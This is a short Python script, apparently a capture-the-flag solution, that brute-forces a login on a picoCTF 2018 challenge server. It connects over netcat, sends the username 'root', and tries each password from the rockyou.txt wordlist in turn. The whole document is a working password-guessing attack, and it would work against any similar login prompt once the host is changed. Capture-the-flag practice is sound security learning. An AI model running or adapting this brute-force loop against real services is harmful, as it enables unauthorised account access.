from netcat import Netcat

with open('./rockyou.txt') as f:
    while True:
        s_line = f.readline()
        try:
            nc = Netcat('2018shell2.picoctf.com', 5221)
            for i in range(3):
                lines = nc.read().decode('utf-8').split('\n')
                for line in lines:
                    print(line)
                mes = lines[-1]
                statement = mes.split(' ')
                if statement[0] == 'Username:':
                    nc.write('root')
                    print('root')
                elif statement[0] == 'Password:':
                    nc.write(s_line)
                    print(s_line)
                elif statement[0] == 'Failed Login!':
                    print('Failed Login!')
                else:
                    raise Exception
        except Exception:
            pass
        nc.close()
        if not s_line:
            break
